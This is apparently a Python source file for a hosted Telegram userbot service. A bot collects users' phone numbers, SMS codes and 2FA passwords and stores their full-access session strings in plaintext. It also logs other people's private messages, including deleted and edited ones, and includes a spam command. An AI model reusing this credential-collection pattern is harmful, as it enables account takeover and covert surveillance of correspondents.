import asyncio
import sqlite3
import os
from datetime import datetime
from threading import Thread
from flask import Flask
from telethon import TelegramClient, events
from telethon.tl.types import PeerUser
from telethon.sessions import StringSession
from aiogram import Bot, Dispatcher, types as aiogram_types
import nest_asyncio
import logging

logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
nest_asyncio.apply()

# ========== КОНФИГ ==========
API_ID = int(os.environ.get('API_ID'))
API_HASH = os.environ.get('API_HASH')
BOT_TOKEN = os.environ.get('BOT_TOKEN')

# ========== БД ==========
conn = sqlite3.connect('userbot.db', check_same_thread=False)
cursor = conn.cursor()
cursor.execute('''CREATE TABLE IF NOT EXISTS user_sessions (user_id INTEGER PRIMARY KEY, session_string TEXT)''')
cursor.execute('''CREATE TABLE IF NOT EXISTS muted_users (user_id INTEGER, muted_by INTEGER, PRIMARY KEY (user_id, muted_by))''')
cursor.execute('''CREATE TABLE IF NOT EXISTS saved_messages (id INTEGER PRIMARY KEY AUTOINCREMENT, owner_id INTEGER, msg_id INTEGER, sender_id INTEGER, text TEXT, date TEXT)''')
conn.commit()

# ========== ГЛОБАЛЬНЫЕ ХРАНИЛИЩА ==========
active_clients = {}
saved_messages = {}  # owner_id -> {msg_id: {"sender_id": int, "text": str}}
temp_auth = {}

# ========== БОТ ДЛЯ РЕГИСТРАЦИИ ==========
reg_bot = Bot(token=BOT_TOKEN)
dp = Dispatcher(reg_bot)

def get_code_keyboard():
    kb = aiogram_types.InlineKeyboardMarkup(row_width=3)
    for i in range(1, 10):
        kb.insert(aiogram_types.InlineKeyboardButton(str(i), callback_data=f"c_{i}"))
    kb.row(
        aiogram_types.InlineKeyboardButton("0", callback_data="c_0"),
        aiogram_types.InlineKeyboardButton("⌫", callback_data="c_del"),
        aiogram_types.InlineKeyboardButton("✅", callback_data="c_ok")
    )
    return kb

@dp.message_handler(commands=['start'])
async def start_auth(message: aiogram_types.Message):
    user_id = message.from_user.id
    
    cursor.execute('SELECT session_string FROM user_sessions WHERE user_id=?', (user_id,))
    row = cursor.fetchone()
    if row:
        await message.answer("✅ Ты уже авторизован! Юзербот активен.")
        if user_id not in active_clients:
            asyncio.create_task(run_userbot(user_id, row[0]))
        return
    
    kb = aiogram_types.ReplyKeyboardMarkup(resize_keyboard=True, one_time_keyboard=True)
    kb.add(aiogram_types.KeyboardButton("📱 Поделиться номером", request_contact=True))
    await message.answer("🔐 Отправь свой номер телефона", reply_markup=kb)

@dp.message_handler(content_types=aiogram_types.ContentType.CONTACT)
async def get_phone(message: aiogram_types.Message):
    user_id = message.from_user.id
    phone = message.contact.phone_number
    
    try:
        client = TelegramClient(StringSession(), API_ID, API_HASH)
        await client.connect()
        result = await client.send_code_request(phone)
        temp_auth[user_id] = {
            "client": client,
            "phone": phone,
            "hash": result.phone_code_hash,
            "code": ""
        }
        await message.answer("📱 Введи код из SMS:", reply_markup=get_code_keyboard())
        await message.answer("Используй кнопки", reply_markup=aiogram_types.ReplyKeyboardRemove())
    except Exception as e:
        await message.answer(f"❌ Ошибка: {e}")

@dp.callback_query_handler(lambda c: c.data.startswith('c_'))
async def code_callback(callback: aiogram_types.CallbackQuery):
    user_id = callback.from_user.id
    if user_id not in temp_auth:
        await callback.answer("Начни заново /start")
        return
    
    action = callback.data[2:]
    current = temp_auth[user_id]["code"]
    
    if action == "del":
        temp_auth[user_id]["code"] = current[:-1]
    elif action == "ok":
        if len(current) == 5:
            await callback.answer("Авторизация...")
            await complete_auth(callback, user_id)
            return
        else:
            await callback.answer(f"Нужно 5 цифр (сейчас {len(current)})", show_alert=True)
            return
    else:
        if len(current) < 5:
            temp_auth[user_id]["code"] = current + action
    
    code = temp_auth[user_id]["code"]
    display = code if code else " "
    await callback.message.edit_text(f"📱 Код: `{display}`", parse_mode="Markdown", reply_markup=get_code_keyboard())
    await callback.answer()

async def complete_auth(callback, user_id: int):
    data = temp_auth[user_id]
    try:
        await data["client"].sign_in(phone=data["phone"], code=data["code"], phone_code_hash=data["hash"])
        session_str = data["client"].session.save()
        cursor.execute('INSERT OR REPLACE INTO user_sessions (user_id, session_string) VALUES (?, ?)', (user_id, session_str))
        conn.commit()
        await callback.message.answer("✅ Авторизация успешна!")
        asyncio.create_task(run_userbot(user_id, session_str))
        await data["client"].disconnect()
        del temp_auth[user_id]
    except Exception as e:
        if "2FA" in str(e) or "password" in str(e).lower():
            await callback.message.answer("🔐 Введи пароль от 2FA:")
            temp_auth[user_id]["step"] = "2fa"
        else:
            await callback.message.answer(f"❌ Ошибка: {e}")

@dp.message_handler(lambda msg: msg.from_user.id in temp_auth and temp_auth[msg.from_user.id].get("step") == "2fa")
async def handle_2fa(message: aiogram_types.Message):
    user_id = message.from_user.id
    data = temp_auth[user_id]
    try:
        await data["client"].sign_in(password=message.text.strip())
        session_str = data["client"].session.save()
        cursor.execute('INSERT OR REPLACE INTO user_sessions (user_id, session_string) VALUES (?, ?)', (user_id, session_str))
        conn.commit()
        await message.answer("✅ Авторизация успешна!")
        asyncio.create_task(run_userbot(user_id, session_str))
        await data["client"].disconnect()
        del temp_auth[user_id]
    except Exception as e:
        await message.answer(f"❌ Ошибка: {e}")

# ========== ЮЗЕРБОТ ==========

async def run_userbot(owner_id: int, session_string: str):
    if owner_id in active_clients:
        try:
            await active_clients[owner_id].disconnect()
        except:
            pass
    
    client = TelegramClient(StringSession(session_string), API_ID, API_HASH)
    await client.connect()
    
    if not await client.is_user_authorized():
        logging.error(f"❌ {owner_id} не авторизован")
        return
    
    active_clients[owner_id] = client
    saved_messages[owner_id] = {}
    logging.info(f"✅ Юзербот запущен для {owner_id}")
    
    # Загружаем мут-лист
    cursor.execute('SELECT user_id FROM muted_users WHERE muted_by=?', (owner_id,))
    muted_users = {row[0] for row in cursor.fetchall()}
    
    # ========== 1. СОХРАНЕНИЕ ВХОДЯЩИХ СООБЩЕНИЙ ==========
    @client.on(events.NewMessage(incoming=True))
    async def save_incoming(event):
        if not isinstance(event.message.peer_id, PeerUser):
            return
        
        sender_id = event.sender_id
        msg_id = event.message.id
        text = event.message.text or ""
        
        # Проверка на мут
        if sender_id in muted_users:
            await event.delete()
            logging.info(f"🗑 {owner_id}: удалено от {sender_id}")
            return
        
        if text:
            # Сохраняем в память
            saved_messages[owner_id][msg_id] = {
                "sender_id": sender_id,
                "text": text
            }
            # Сохраняем в БД
            cursor.execute('INSERT INTO saved_messages (owner_id, msg_id, sender_id, text, date) VALUES (?, ?, ?, ?, ?)',
                          (owner_id, msg_id, sender_id, text, datetime.now().isoformat()))
            conn.commit()
            logging.info(f"💾 {owner_id}: сохранено {msg_id} от {sender_id}: {text[:50]}")
    
    # ========== 2. ОТСЛЕЖИВАНИЕ УДАЛЕНИЙ ==========
    @client.on(events.MessageDeleted)
    async def on_delete(event):
        if not isinstance(event.chat, PeerUser):
            return
        
        for msg_id in event.deleted_ids:
            # Ищем в памяти
            msg = saved_messages.get(owner_id, {}).get(msg_id)
            
            # Если нет в памяти, ищем в БД
            if not msg:
                cursor.execute('SELECT sender_id, text FROM saved_messages WHERE owner_id=? AND msg_id=?', (owner_id, msg_id))
                row = cursor.fetchone()
                if row:
                    msg = {"sender_id": row[0], "text": row[1]}
            
            if msg and msg["sender_id"] != owner_id:
                try:
                    user = await client.get_entity(msg["sender_id"])
                    name = user.first_name or "Пользователь"
                    
                    await client.send_message(
                        owner_id,
                        f"🗑 <b>{name}</b> удалил сообщение:\n\n<blockquote>{msg['text'][:500]}</blockquote>",
                        parse_mode='HTML'
                    )
                    logging.info(f"📨 {owner_id}: уведомление об удалении от {msg['sender_id']}")
                    
                    # Удаляем из БД
                    cursor.execute('DELETE FROM saved_messages WHERE owner_id=? AND msg_id=?', (owner_id, msg_id))
                    conn.commit()
                    
                    # Удаляем из памяти
                    if msg_id in saved_messages.get(owner_id, {}):
                        del saved_messages[owner_id][msg_id]
                        
                except Exception as e:
                    logging.error(f"Ошибка удаления {owner_id}: {e}")
    
    # ========== 3. ОТСЛЕЖИВАНИЕ ИЗМЕНЕНИЙ ==========
    @client.on(events.MessageEdited)
    async def on_edit(event):
        if not isinstance(event.message.peer_id, PeerUser) or event.out:
            return
        
        msg_id = event.id
        new_text = event.message.text or ""
        
        # Ищем в памяти
        msg = saved_messages.get(owner_id, {}).get(msg_id)
        
        # Если нет в памяти, ищем в БД
        if not msg:
            cursor.execute('SELECT sender_id, text FROM saved_messages WHERE owner_id=? AND msg_id=?', (owner_id, msg_id))
            row = cursor.fetchone()
            if row:
                msg = {"sender_id": row[0], "text": row[1]}
        
        if msg and msg["sender_id"] != owner_id and msg["text"] != new_text:
            try:
                user = await client.get_entity(msg["sender_id"])
                name = user.first_name or "Пользователь"
                
                await client.send_message(
                    owner_id,
                    f"✏️ <b>{name}</b> изменил сообщение:\n\n"
                    f"<b>Было:</b>\n<blockquote>{msg['text'][:200]}</blockquote>\n"
                    f"<b>Стало:</b>\n<blockquote>{new_text[:200]}</blockquote>",
                    parse_mode='HTML'
                )
                logging.info(f"📨 {owner_id}: уведомление об изменении от {msg['sender_id']}")
                
                # Обновляем в БД
                cursor.execute('UPDATE saved_messages SET text=? WHERE owner_id=? AND msg_id=?', (new_text, owner_id, msg_id))
                conn.commit()
                
                # Обновляем в памяти
                saved_messages[owner_id][msg_id]["text"] = new_text
                
            except Exception as e:
                logging.error(f"Ошибка изменения {owner_id}: {e}")
    
    # ========== 4. КОМАНДЫ ==========
    @client.on(events.NewMessage(outgoing=True))
    async def commands(event):
        if not isinstance(event.message.peer_id, PeerUser):
            return
        
        text = event.message.text or ""
        if not text.startswith('.'):
            return
        
        logging.info(f"📨 Команда от {owner_id}: {text}")
        
        # .help
        if text == '.help':
            await event.edit("""<b>📝 КОМАНДЫ ЮЗЕРБОТА</b>

<i>Работает только в ЛИЧНЫХ СООБЩЕНИЯХ</i>

<blockquote>
<b>.help</b> - эта справка
<b>.mute</b> (ответ) - заглушить пользователя
<b>.unmute</b> (ответ) - разглушить
<b>.list</b> - список замьюченных
<b>.info</b> (ответ) - информация о пользователе
<b>.type [текст]</b> - эффект печати
<b>.spam [кол-во] [текст]</b> - спам (макс 20)
</blockquote>

<i>Автоматические уведомления:</i>
• Когда кто-то удаляет сообщение в ЛС с тобой
• Когда кто-то изменяет сообщение в ЛС с тобой""", parse_mode='HTML')
            return
        
        # .mute
        if text == '.mute':
            reply = await event.get_reply_message()
            if reply and reply.sender_id and reply.sender_id != owner_id:
                cursor.execute('INSERT OR IGNORE INTO muted_users (user_id, muted_by) VALUES (?, ?)', (reply.sender_id, owner_id))
                conn.commit()
                muted_users.add(reply.sender_id)
                await event.edit(f'🔕 Пользователь заглушен')
            else:
                await event.edit('❌ Ответь на сообщение пользователя')
            return
        
        # .unmute
        if text == '.unmute':
            reply = await event.get_reply_message()
            if reply and reply.sender_id:
                cursor.execute('DELETE FROM muted_users WHERE user_id=? AND muted_by=?', (reply.sender_id, owner_id))
                conn.commit()
                muted_users.discard(reply.sender_id)
                await event.edit(f'🔔 Пользователь разглушен')
            else:
                await event.edit('❌ Ответь на сообщение пользователя')
            return
        
        # .list
        if text == '.list':
            if muted_users:
                names = []
                for uid in list(muted_users)[:20]:
                    try:
                        u = await client.get_entity(uid)
                        names.append(f"• {u.first_name}")
                    except:
                        names.append(f"• {uid}")
                await event.edit(f"🔕 <b>Замьюченные:</b>\n\n" + "\n".join(names), parse_mode='HTML')
            else:
                await event.edit("🔕 Нет замьюченных")
            return
        
        # .info
        if text == '.info':
            reply = await event.get_reply_message()
            if reply and reply.sender_id:
                try:
                    u = await client.get_entity(reply.sender_id)
                    is_muted = "✅ Да" if reply.sender_id in muted_users else "❌ Нет"
                    username = f"@{u.username}" if u.username else "нет"
                    await event.edit(f"<b>👤 ИНФОРМАЦИЯ</b>\n\n<b>ID:</b> <code>{u.id}</code>\n<b>Имя:</b> {u.first_name}\n<b>Username:</b> {username}\n<b>Заглушен:</b> {is_muted}", parse_mode='HTML')
                except Exception as e:
                    await event.edit(f"❌ Ошибка: {e}")
            else:
                await event.edit('❌ Ответь на сообщение')
            return
        
        # .type
        if text.startswith('.type '):
            txt = text[6:]
            if txt:
                await event.edit(".")
                typed = ""
                for ch in txt:
                    typed += ch
                    try:
                        await event.edit(typed)
                    except:
                        pass
                    await asyncio.sleep(0.3)
            return
        
        # .spam
        if text.startswith('.spam '):
            parts = text.split(' ', 2)
            if len(parts) >= 2:
                try:
                    count = min(int(parts[1]), 20)
                    msg = parts[2] if len(parts) > 2 else None
                    if not msg:
                        reply = await event.get_reply_message()
                        if reply:
                            msg = reply.text
                    if msg:
                        await event.delete()
                        for i in range(count):
                            await client.send_message(event.chat_id, msg)
                            await asyncio.sleep(0.3)
                except:
                    pass
            return
    
    await client.run_until_disconnected()

# ========== ВЕБ-СЕРВЕР ==========
flask_app = Flask(__name__)

@flask_app.route('/')
def health():
    return "OK"

def run_web():
    flask_app.run(host='0.0.0.0', port=8080)

async def restore_sessions():
    cursor.execute('SELECT user_id, session_string FROM user_sessions')
    for user_id, session_str in cursor.fetchall():
        asyncio.create_task(run_userbot(user_id, session_str))

async def main():
    logging.info("🚀 Запуск...")
    await restore_sessions()
    while True:
        await asyncio.sleep(10)

def start_aiogram():
    from aiogram.utils import executor
    executor.start_polling(dp, skip_updates=True)

if __name__ == "__main__":
    Thread(target=run_web, daemon=True).start()
    Thread(target=start_aiogram, daemon=True).start()
    asyncio.run(main())
